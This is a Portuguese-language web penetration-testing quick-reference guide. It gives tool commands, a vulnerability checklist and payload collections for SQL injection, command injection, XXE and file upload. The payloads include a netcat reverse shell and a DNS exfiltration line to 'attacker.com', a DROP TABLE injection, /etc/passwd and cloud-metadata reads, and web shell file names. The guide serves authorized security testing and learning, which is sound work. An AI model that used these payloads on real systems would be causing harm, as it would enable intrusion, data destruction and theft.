# 🎯 GUIA DE TESTE RÁPIDO

## Quick Reference - Ferramentas Essenciais

```bash
# Testes de Vulnerabilidade Web
sqlmap -u "http://target.com?id=1" --dbs          # SQLi enumeration
commix -u "http://target.com?cmd=" -p cmd         # Command Injection
xxefuzz -u "http://target.com" --payloads         # XXE testing
ssrfmap -u "http://target.com/fetch" -p url       # SSRF detection

# Web Vulnerability Scanner
zaproxy -cmd -quickurl http://target.com         # OWASP ZAP
burpsuite --project-file=scan.burp                # Burp Suite Pro

# Ferramenta all-in-one
python3 -m http.server 8000                       # Simple HTTP server
curl -v http://target.com                        # Requests with verbose
wget --spider http://target.com                  # Website structure
```

---

## 📋 Checklist de Teste

### Server-Side Vulnerabilities
- [ ] **SQL Injection**
  - [ ] Try: `' OR '1'='1`
  - [ ] Try: `'; DROP TABLE users--`
  - [ ] Use: sqlmap
  - [ ] Time-based: `SLEEP(5)`

- [ ] **Command Injection**
  - [ ] Try: `; whoami`
  - [ ] Try: `| cat /etc/passwd`
  - [ ] Try: `& ping -c 10 127.0.0.1 &`
  - [ ] Check: stderr/stdout in response

- [ ] **XXE Injection**
  - [ ] Try: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`
  - [ ] Check: XML parsers
  - [ ] Blind XXE: DNS exfiltration

- [ ] **SSRF**
  - [ ] Try: `http://127.0.0.1/admin`
  - [ ] Try: `http://169.254.169.254/latest/meta-data/`
  - [ ] Port scan: 22, 80, 443, 3306, 6379, 9200

- [ ] **File Upload**
  - [ ] Try: .phtml, .php5, .php7
  - [ ] Try: `shell.php%00.jpg`
  - [ ] MIME type mismatch
  - [ ] Polyglot files

- [ ] **Directory Traversal**
  - [ ] Try: `../../../etc/passwd`
  - [ ] Try: `..%2F..%2F..%2Fetc%2Fpasswd`
  - [ ] Null byte: `../../etc/passwd%00.jpg`

### Client-Side Vulnerabilities
- [ ] **XSS**
  - [ ] Reflected: `<script>alert('XSS')</script>`
  - [ ] Stored: Input persistence
  - [ ] DOM: `eval()`, `innerHTML`

- [ ] **CSRF**
  - [ ] Check: CSRF tokens
  - [ ] SameSite cookies

- [ ] **CORS Misconfiguration**
  - [ ] `Access-Control-Allow-Origin: *`
  - [ ] Credentials with wildcard

### Authentication & Authorization
- [ ] **Brute Force**
  - [ ] No rate limiting?
  - [ ] Weak password policy?

- [ ] **IDOR (Insecure Direct Object Reference)**
  - [ ] Sequential IDs: /user/1, /user/2, /user/3
  - [ ] Predictable references

- [ ] **Session Management**
  - [ ] Session fixation
  - [ ] Insecure session storage
  - [ ] No timeout

---

## 🔧 Payload Collections

### SQLi Payloads
```sql
-- Basic
' OR '1'='1
' OR 1=1--
' OR 'a'='a

-- UNION-based
' UNION SELECT NULL, username, password FROM users--
' UNION SELECT table_name FROM information_schema.tables--

-- Time-based Blind
' AND SLEEP(5)--
'; WAITFOR DELAY '00:00:05'--

-- Error-based
' AND extractvalue(1,concat(0x7e,(select version())))--
```

### Command Injection Payloads
```bash
# Basic
; whoami
| cat /etc/passwd
& ping -c 10 127.0.0.1
|| nc -e /bin/sh attacker.com 4444

# Blind with DNS
& nslookup `whoami`.attacker.com &

# Encoding bypass
${IFS}whoami
$(whoami)
`whoami`
```

### XXE Payloads
```xml
<!-- File read -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>

<!-- SSRF -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1/admin">]>

<!-- Billion Laughs DoS -->
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;">
]>
```

### File Upload Payloads
```
shell.php           # Basic
shell.phtml         # Apache
shell.php5          # Older PHP
shell.php%00.jpg    # Null byte
shell.php....       # Dot bypass
GIF89a<?php ...?>   # Polyglot
```

---

## 🎓 Aprendizado Estruturado

**Iniciante (1-2 semanas):**
1. Entender HTTP/HTTPS basics
2. SQL Injection fundamentals
3. XSS basics
4. OWASP Top 10

**Intermediário (2-4 semanas):**
1. Advanced SQLi (UNION, Blind, Time-based)
2. Command Injection techniques
3. XXE attacks
4. Authentication bypass

**Avançado (4+ semanas):**
1. Chain exploits (SSRF → RCE)
2. Race conditions
3. Logic flaws
4. Threat modeling

---

## 📌 Ferramentas por Vulnerabilidade

| Vulnerabilidade | Ferramenta | Comando |
|---|---|---|
| SQLi | sqlmap | `sqlmap -u URL --dbs` |
| XSS | Burp | Manual testing |
| SSRF | ssrfmap | `ssrfmap -u URL -p param` |
| XXE | Payload tester | XML crafting |
| File Upload | Burp | Upload + intercept |
| CSRF | Burp | Check token presence |
| Weak Auth | Hydra | `hydra -l admin -P words.txt http://target` |
| Directory Traversal | DirBuster | `dirb URL -w wordlist.txt` |

---

## 🚨 Armadilhas Comuns

1. **Esquecer de URL encode** - `space = %20`, `/ = %2F`
2. **Não testar variações** - Maiúsculas, dupla encoding, nullbyte
3. **Assumir proteção existe** - Sempre testar mesmo com validação visível
4. **Ignorar comentários HTML** - Credenciais em `<!-- -->`
5. **Não explorar até o fim** - De XSS para RCE, de SQLi para admin

---

## ✅ Checklist Pré-Exploração

- [ ] Escopo definido (permissão por escrito)
- [ ] Ferramenta de proxy configurada (Burp/ZAP)
- [ ] VPN/túnel seguro ativo
- [ ] Logs de ataque desabilitados (se autorizado)
- [ ] Plano de rollback em caso de dano
- [ ] Contato de emergência disponível

---

**Importante:** Teste APENAS em sistemas que você tem permissão. Acesso não autorizado é CRIME.

Última atualização: Agosto 2026
